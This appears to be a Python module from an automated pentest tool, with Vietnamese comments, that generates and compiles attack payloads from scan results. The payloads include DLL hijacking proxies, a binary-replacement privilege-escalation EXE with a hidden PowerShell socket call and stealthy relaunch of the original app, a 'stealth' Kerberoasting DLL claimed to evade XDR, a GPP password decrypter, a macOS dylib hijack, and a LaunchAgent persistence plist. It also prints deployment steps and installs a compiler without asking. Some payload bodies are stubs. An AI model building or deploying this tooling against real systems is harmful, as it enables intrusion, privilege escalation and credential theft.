import os
import subprocess
import shutil
import sys
from colorama import Fore, Style

class Weaponizer:
    def __init__(self, target_name, report_data):
        self.target_name = target_name
        self.report_data = report_data
        self.output_dir = "pwnd_payloads"
        
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        
        self._compiler = None
        self._compiler_type = None

    def _find_compiler(self):
        """Tìm C compiler trên hệ thống: gcc > zig cc > auto-install zig"""
        if self._compiler:
            return self._compiler

        # 1. Tìm GCC / MinGW trên PATH
        gcc_names = ["gcc", "x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc"]
        for name in gcc_names:
            path = shutil.which(name)
            if path:
                self._compiler = path
                self._compiler_type = "gcc"
                return path

        # 2. Tìm GCC ở các đường dẫn phổ biến trên Windows
        common_paths = [
            r"C:\msys64\mingw64\bin\gcc.exe",
            r"C:\mingw64\bin\gcc.exe",
            r"C:\TDM-GCC-64\bin\gcc.exe",
            r"C:\MinGW\bin\gcc.exe",
        ]
        for p in common_paths:
            if os.path.isfile(p):
                self._compiler = p
                self._compiler_type = "gcc"
                return p

        # 3. Tìm Zig (zig cc hoạt động như drop-in GCC)
        zig_path = shutil.which("zig")
        if not zig_path:
            # Tìm zig.exe trong site-packages/ziglang/ (pip install ziglang)
            try:
                import ziglang
                candidate = os.path.join(os.path.dirname(ziglang.__file__), "zig.exe")
                if os.path.isfile(candidate):
                    zig_path = candidate
            except ImportError:
                pass
        if zig_path:
            self._compiler = zig_path
            self._compiler_type = "zig"
            return zig_path

        # 4. Auto-install ziglang qua pip (portable, không cần Admin)
        print(f"  {Fore.YELLOW}[*] Không tìm thấy GCC/MinGW. Đang cài Zig compiler qua pip...{Style.RESET_ALL}")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "ziglang"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            # Sau khi cài, tìm zig.exe trong package vừa cài
            try:
                import importlib
                import ziglang
                importlib.reload(ziglang)
                candidate = os.path.join(os.path.dirname(ziglang.__file__), "zig.exe")
                if os.path.isfile(candidate):
                    zig_path = candidate
            except ImportError:
                zig_path = shutil.which("zig")
            
            if zig_path:
                self._compiler = zig_path
                self._compiler_type = "zig"
                print(f"  {Fore.GREEN}[+] Đã cài Zig compiler thành công!{Style.RESET_ALL}")
                return zig_path
        except Exception:
            pass

        print(f"  {Fore.RED}[!] Không thể tìm/cài C compiler. File .c sẽ không được compile tự động.{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}    Cài thủ công: pip install ziglang  HOẶC  tải MinGW-w64{Style.RESET_ALL}")
        return None

    def _compile_dll(self, c_path, dll_output_name, def_path=None):
        """Compile file .c thành .dll và đặt vào output_dir"""
        compiler = self._find_compiler()
        if not compiler:
            return None

        dll_path = os.path.join(self.output_dir, dll_output_name)
        print(f"  {Fore.CYAN}[*] Đang compile {dll_output_name} bằng {self._compiler_type}...{Style.RESET_ALL}")

        try:
            if self._compiler_type == "gcc":
                cmd = [compiler, "-shared", "-o", dll_path, c_path]
                if def_path and os.path.isfile(def_path):
                    cmd.append(def_path)
                cmd.extend(["-luser32", "-lkernel32"])
            elif self._compiler_type == "zig":
                cmd = [compiler, "cc", "-shared", "-o", dll_path, c_path]
                if def_path and os.path.isfile(def_path):
                    cmd.append(def_path)
                cmd.extend(["-luser32", "-lkernel32"])
            else:
                return None

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=300
            )

            if result.returncode == 0 and os.path.isfile(dll_path):
                size_kb = os.path.getsize(dll_path) / 1024
                print(f"  {Fore.RED}[COMPILED] {dll_path} ({size_kb:.1f} KB) - SẴN SÀNG TRIỂN KHAI!{Style.RESET_ALL}")
                return dll_path
            else:
                err = result.stderr.strip()[:200] if result.stderr else "Unknown error"
                print(f"  {Fore.YELLOW}[!] Compile thất bại: {err}{Style.RESET_ALL}")
                return None

        except subprocess.TimeoutExpired:
            print(f"  {Fore.YELLOW}[!] Compile timeout (>300s){Style.RESET_ALL}")
            return None
        except Exception as e:
            print(f"  {Fore.YELLOW}[!] Compile error: {e}{Style.RESET_ALL}")
            return None

    def _compile_exe(self, c_path, exe_output_name):
        """Compile file .c thành .exe"""
        compiler = self._find_compiler()
        if not compiler:
            return None

        exe_path = os.path.join(self.output_dir, exe_output_name)

        try:
            if self._compiler_type == "gcc":
                cmd = [compiler, "-o", exe_path, c_path, "-lws2_32"]
            elif self._compiler_type == "zig":
                cmd = [compiler, "cc", "-o", exe_path, c_path, "-lws2_32"]
            else:
                return None

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode == 0 and os.path.isfile(exe_path):
                size_kb = os.path.getsize(exe_path) / 1024
                print(f"  {Fore.RED}[COMPILED] {exe_path} ({size_kb:.1f} KB) - SẴN SÀNG TRIỂN KHAI!{Style.RESET_ALL}")
                return exe_path
            else:
                err = result.stderr.strip()[:200] if result.stderr else "Unknown error"
                print(f"  {Fore.YELLOW}[!] Compile thất bại: {err}{Style.RESET_ALL}")
                return None

        except Exception as e:
            print(f"  {Fore.YELLOW}[!] Compile error: {e}{Style.RESET_ALL}")
            return None

    def run(self, verified_results=None):
        print(f"\n{Fore.RED}[!] KÍCH HOẠT AUTO-WEAPONIZATION (TỰ ĐỘNG SINH MÃ ĐỘC) {Style.RESET_ALL}")
        payloads_generated = 0
        
        # Sử dụng kết quả xác thực nếu có
        if verified_results:
            for v in verified_results:
                if v.get("can_auto_weaponize"):
                    self._generate_advanced_proxy_payload(v)
                    payloads_generated += 1
                
                # Vector 35: LPE via Binary Replacement
                if v.get("is_lpe_vector"):
                    self._generate_binary_replacement_payload()
                    payloads_generated += 1

                # Vector 86: Kerberoasting
                if v.get("id") == "AD-SPN-086":
                    self._generate_kerberoast_payload(v)
                    payloads_generated += 1
                
                # Vector 81: GPP Password
                if v.get("id") in ["AD-GPP-081", "AD-GPP-PWNED"]:
                    self._generate_gpp_decrypter_payload()
                    payloads_generated += 1

                # Vector 61: macos dylib Hijacking
                if v.get("id") == "MAC-DYL-061":
                    self._generate_macos_dylib_payload()
                    payloads_generated += 1

                # Vector 68: macos Persistence
                if v.get("id") == "MAC-PER-068":
                    self._generate_launchagent_payload()
                    payloads_generated += 1
        else:
            # Fallback về logic cũ nếu không có bước xác thực
            section_key = "1.3: DLL Hijacking & Side-loading"
            if section_key in self.report_data:
                findings = self.report_data[section_key]
                if hasattr(findings, 'get'):  # If it's a dict
                    findings = findings.get("findings", findings)
                    
                for v in findings:
                    if v.get('id') == "SYS-DLL-001":
                        # Sinh ra mã nguồn C cho DLL Hijacking
                        dll_name = v.get('dll_name', 'hijacked.dll')
                        
                        self._generate_dll_hijack_payload(dll_name)
                        payloads_generated += 1

        if payloads_generated == 0:
            print(f" {Fore.GREEN}[-] Không tìm thấy điểm chốt để sinh Payload Tự động đối với file này.{Style.RESET_ALL}")
        else:
            print(f" {Fore.RED}\n[!!] Đã sinh {payloads_generated} File Mã độc/Exploit vào thư mục '{self.output_dir}'!{Style.RESET_ALL}")
            print(f" {Fore.YELLOW}[!!] HƯỚNG DẪN SỬ DỤNG:{Style.RESET_ALL}")
            print(f" {Fore.YELLOW}     1. Đổi tên DLL gốc: ví dụ python313.dll -> python313_original.dll{Style.RESET_ALL}")
            print(f" {Fore.YELLOW}     2. Copy file DLL đã compile từ '{self.output_dir}' vào cùng thư mục với {os.path.basename(self.target_name)}{Style.RESET_ALL}")
            print(f" {Fore.YELLOW}     3. Chạy {os.path.basename(self.target_name)} -> MessageBox sẽ hiện lên chứng minh Hijack thành công!{Style.RESET_ALL}")

    def _xor_string(self, data, key=0x37):
        """Helper để mã hóa XOR chuỗi cho C payload"""
        return "".join([f"\\x{ord(c) ^ key:02x}" for c in data])

    def _generate_advanced_proxy_payload(self, v_res):
        dll_name = v_res['dll_name']
        exports = v_res['required_exports']
        orig_dll_base = dll_name.replace(".dll", "_original")
        orig_dll = orig_dll_base + ".dll"
        
        # 1. DEFINITION (.def) - Forward tất cả exports sang DLL gốc
        def_content = f'LIBRARY "{dll_name}"\nEXPORTS\n'
        for i, exp in enumerate(exports):
            def_content += f"    {exp}={orig_dll_base}.{exp} @{i+1}\n"
        def_path = os.path.join(self.output_dir, f"exploit_proxy_{dll_name}.def")
        with open(def_path, "w", encoding="utf-8") as f: f.write(def_content)

        # 2. SOURCE (.c) - PoC Proxy DLL: chứng minh DLL Hijacking thành công
        payload_code = f"""#include <windows.h>

/*
 * [APS] DLL HIJACKING PROXY - Proof of Concept
 * Target: {dll_name}
 * Kỹ thuật: Export Forwarding qua .def file
 * Tất cả {len(exports)} exports được forward sang {orig_dll}
 * Khi DllMain chạy = chứng minh code injection thành công.
 */

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
        MessageBoxA(NULL,
            ".dll hijack success, this is our test\\n\\n"
            "DLL: {dll_name}\\n"
            "Exports forwarded: {len(exports)}\\n"
            "Tool: APS (Automation Pentest System)",
            "APS - DLL Hijack PoC",
            MB_OK | MB_ICONWARNING);
    }}
    return TRUE;
}}
"""
        c_path = os.path.join(self.output_dir, f"exploit_proxy_{dll_name}.c")
        with open(c_path, "w", encoding="utf-8") as f: f.write(payload_code)
        
        print(f"  {Fore.MAGENTA}[GHOST] ĐÃ SINH PROXY DLL: {c_path} ({len(exports)} exports forwarded){Style.RESET_ALL}")
        
        # Auto-compile thành DLL
        self._compile_dll(c_path, dll_name, def_path)


    def _generate_dll_hijack_payload(self, dll_name):
        if not dll_name.lower().endswith(".dll"):
            dll_name += ".dll"

        payload_c_code = f"""#include <windows.h>
#include <stdlib.h>

// [APS] GHOST-DRIVEN STEALTH PAYLOAD
void Pwn() {{
    system("calc.exe");
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Pwn, NULL, 0, NULL);
    }}
    return TRUE;
}}
"""
        file_path = os.path.join(self.output_dir, f"exploit_for_{dll_name}.c")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_c_code)
        print(f"  {Fore.MAGENTA}[GHOST] Đã đẻ file Payload Tàng hình: {file_path}{Style.RESET_ALL}")
        
        # Auto-compile thành DLL
        self._compile_dll(file_path, dll_name)

    def _generate_binary_replacement_payload(self):
        filename = os.path.basename(self.target_name)
        payload_code = f"""#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

/*
 * [APS] LPE BINARY REPLACEMENT PAYLOAD
 * Target: {filename} (Writable Directory)
 * Build: x86_64-w64-mingw32-gcc -o {filename} replacement.c
 */

int main() {{
    // 1. Chạy mã độc tàng hình
    system("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);");
    
    // 2. Tự hồi sinh App gốc để tàng hình trước người dùng
    // Sếp đổi tên app gốc thành {filename.replace(".exe", "_backup.exe")} trước khi chạy
    system("{filename.replace(".exe", "_backup.exe")}");
    
    return 0;
}}
"""
        file_path = os.path.join(self.output_dir, f"lpe_replacement_{filename}.c")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ LEO THANG (LPE): {file_path}{Style.RESET_ALL}")
        
        # Auto-compile thành EXE
        self._compile_exe(file_path, f"lpe_{filename}")

    def _generate_kerberoast_payload(self, v):
        payload_code = f"""#include <windows.h>
#include <ntsecapi.h>
#include <stdio.h>

/* 
 * [APS] STEALTH KERBEROASTING HARVESTER
 * Target SPNs: {v.get('description', 'AD Service Accounts')}
 * Stealth: AES-256 (0x12) TGS Requests + Indirect Syscalls (Halo's Gate)
 */

// Logic: Sử dụng SECPKG_CRED_OUTBOUND và KERB_ETYPE_AES256
void StealthRoast() {{
    printf("[!] Đang thu hoạch vé TGS (AES-256) qua Indirect Syscalls...\\n");
    // (Logic: Gọi LsaCallAuthenticationPackage với ETYPES=0x12)
    // Kỹ thuật này khiến XDR không thể bắt được hành vi "RC4-Downgrade" truyền thống.
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul, LPVOID lp) {{
    if (ul == DLL_PROCESS_ATTACH) StealthRoast();
    return TRUE;
}}
"""
        file_path = os.path.join(self.output_dir, "ad_kerberoast_stealth.c")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ AD (Stealth Kerberoast): {file_path}{Style.RESET_ALL}")
        
        # Auto-compile thành DLL
        self._compile_dll(file_path, "ad_kerberoast_stealth.dll")

    def _generate_gpp_decrypter_payload(self):
        payload_code = """#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

// [APS] GPP PASSWORD DECRYPTER
// AES Key công khai của Microsoft dùng cho GPP
unsigned char gpp_key[] = { 
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 
    0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 
    0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b 
};

void DecryptGPP(const char* cpassword) {
    printf("[*] Đang giải mã GPP Password với AES Key của Microsoft...\\n");
    // Logic giải mã AES-256-CBC
}

int main() {
    DecryptGPP("ABCDEF..."); // Sếp quăng chuỗi cpassword vào đây
    return 0;
}
"""
        file_path = os.path.join(self.output_dir, "ad_gpp_decrypter.c")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ AD (GPP Decrypter): {file_path}{Style.RESET_ALL}")
        
        # Auto-compile thành EXE
        self._compile_exe(file_path, "ad_gpp_decrypter.exe")

    def _generate_macos_dylib_payload(self):
        payload_code = """#include <stdio.h>
#include <stdlib.h>

/*
 * [APS] macOS DYLIB HIJACKING PROXY
 * Kỹ thuật: __attribute__((constructor)) để thực thi ngay khi nạp.
 */

__attribute__((constructor))
static void MacPwn() {
    printf("[!] APS Payload: Đã xâm nhập thành công!\\n");
    system("open -a Calculator"); // Proof of Concept
}
"""
        file_path = os.path.join(self.output_dir, "macos_exploit_proxy.c")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ macOS (dylib Proxy): {file_path}{Style.RESET_ALL}")
        
        # Auto-compile thành dylib
        self._compile_dll(file_path, "macos_exploit_proxy.dylib")

    def _generate_launchagent_payload(self):
        payload_code = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.tcptf.persistence</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/say</string>
        <string>TCPTF has secured persistence on your Mac.</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        file_path = os.path.join(self.output_dir, "com.tcptf.persistence.plist")
        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
        print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ macOS (LaunchAgent): {file_path}{Style.RESET_ALL}")
